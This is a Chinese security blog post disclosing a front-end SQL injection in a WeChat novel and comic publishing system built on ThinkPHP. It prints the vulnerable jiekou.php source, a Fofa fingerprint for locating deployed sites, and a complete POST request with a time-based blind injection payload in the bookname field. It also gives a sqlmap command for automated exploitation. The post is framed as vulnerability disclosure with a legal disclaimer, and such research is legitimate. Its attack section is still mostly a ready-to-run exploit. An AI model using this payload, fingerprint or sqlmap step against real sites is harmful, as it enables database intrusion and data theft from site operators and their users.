#  微信公众号小说漫画系统存在前台SQL注入漏洞   
原创 Mstir  星悦安全   2024-10-04 11:13  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/lSQtsngIibibSOeF8DNKNAC3a6kgvhmWqvoQdibCCk028HCpd5q1pEeFjIhicyia0IcY7f2G9fpqaUm6ATDQuZZ05yw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
点击上方  
蓝字关注我们 并设为  
星标  
## 0x00 前言  
  
******源码描述：修复版掌上阅读小说源码_公众号漫画源码可以打包漫画app，掌上阅读小说源码支持公众号、代理分站支付功能完善强大的小说源码，可以对接微信公众号、APP打包。支持对接个人微信收款。**  
  
**1新增签到、平台分享奖励书币、小说推广链接生成，更好的推广平台增加粘性。**  
  
**2.新增可自定义中间和底部导航。**  
  
**3.新增可添加章节广告增加收益.**  
  
**4.可以管理公众号菜单、消息推送、自定义回复。**  
  
**5.可以添加加盟商分站，可添加代理、自定义扣量。**  
  
**Fofa指纹:"/Public/home/mhjs/jquery.js"**  
  
****  
****  
**框架:ThinkPHP 3.2.3 Debug:True**  
## 0x01 漏洞分析&复现  
  
**在 jiekou.php 中是处理漫画收录的功能，若配置了正确的数据库链接，则存在SQL注入漏洞，下方直接传入sl和bookname 直接被带入到sql查询中，且无任何过滤.**  
```
<?php
header("Content-type: text/html; charset=utf-8");

$servername = "localhost";
$username = "root";
$password = "root";
$dbname = "www.pnp8.com";
$sl=$_POST['sl'];
$sl1=$_GET['sl1'];
$bookname=$_POST['bookname'];//书名
$author=$_POST['author'];//作者
$des=$_POST['des'];//简介
$tstype=$_POST['tstype'];//漫画首页分类
$sstype=$_POST['sstype'];//所属分类
$zishu=$_POST['zishu'];//简介
$litpic=$_POST['litpic'];//封面图
$time=$_POST['time'];//发布时间
$sharetitle=$_POST['sharetitle'];//发布时间
$mhtitle=$_POST['title'];//漫画标题
$jino=$_POST['jino'];//漫画编号
$mhbody=$_POST['content'];//漫画内容
$jine=$_POST['jine'];//阅读金额
$sex=$_POST['sex'];//阅读金额
$send=$_POST['send'];//打赏金额
$status=$_POST['status'];//小说状态(连载1/完结2)
$free_type=$_POST['free_type'];//属性(免费1/收费2)
$pay_num=$_POST['pay_num'];//第n话开始需要付费


// 漫画阅读数（3万-70万之间）
$reads_mh=mt_rand(30000, 700000);

// 漫画点赞数（1万-2万之间）
$dz_mh=mt_rand(10000, 20000);

// 章节点赞数（1万-2万之间）
$dzzj_mh=mt_rand(10000, 20000);

// 收藏数（5000-9000之间）
$sc_mh=mt_rand(5000, 9000);

// 打赏数（1000-5000之间）
$ds_mh=mt_rand(1000, 5000);

// 小说阅读数（1万-10万之间）
$reads_book=mt_rand(10000, 100000);

// 小说点赞数（3000-1万之间）
$dz_book=mt_rand(3000, 10000);

// 章节点赞数（3000-1万之间）
$dzzj_book=$dz_book;

// 收藏数（3000-5000之间）
$sc_book=mt_rand(3000, 5000);

// 打赏数（1000-3000之间）
$ds_book=mt_rand(1000, 3000);

// 创建连接
$conn = new mysqli($servername, $username, $password, $dbname);
mysqli_set_charset($conn, "utf8");
// 检测连接
if ($conn->connect_error) {
    die("fail: " . $conn->connect_error);
  return;
} 
if($sl1==3)
{
  for($i=114;$i<417;$i++)
  { $upsql="UPDATE vv_mh_list SET summary=share_desc where id=$i";
         $conn->query($upsql);
       echo ' 更新成功';
  }
       return;
}
//添加漫画
if($sl==1){
  if($bookname!=""){
    $stype="SELECT * FROM `vv_mh_list` where title='$bookname'";   ///这里存在注入
      $result=$conn->query($stype);
```  
  
**Payload:**  
```
POST /jiekou.php HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Cache-Control: no-cache
Connection: keep-alive
Content-Length: 20
Content-Type: application/x-www-form-urlencoded
Host: 127.0.0.1
Origin: http://127.0.0.1
Pragma: no-cache
Referer: http://127.0.0.1/jiekou.php
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
sec-ch-ua: "Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
sec-fetch-user: ?1

sl=1&bookname=' AND (SELECT 2775 FROM (SELECT(SLEEP(5)))IiIJ)-- XrlG
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5fBnkA8FHmoQcJsAPoK9THHmHLmttnydHX4EmdlljpjMeE5nFYibHicCr4agFkGuSS2z2icCf4aia6Nbg/640?wx_fmt=other&from=appmsg "")  
**python sqlmap.py -r a.txt --level=3 --dbms=mysql**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5fBnkA8FHmoQcJsAPoK9THHxdEp6YpPF9k1xhFgro3foibQibicWKHcvnO7FVIj2cNLibBCD0cug5lJwg/640?wx_fmt=other&from=appmsg "")  
****  
**标签:代码审计，0day，渗透测试，系统，通用，0day，闲鱼，转转**  
  
**漫画系统源码关注公众号发送 241004 获取!**  
  
  
  
**免责声明:****文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由读者承担全部法律及连带责任，文章作者和本公众号不承担任何法律及连带责任，望周知！！!**  
  
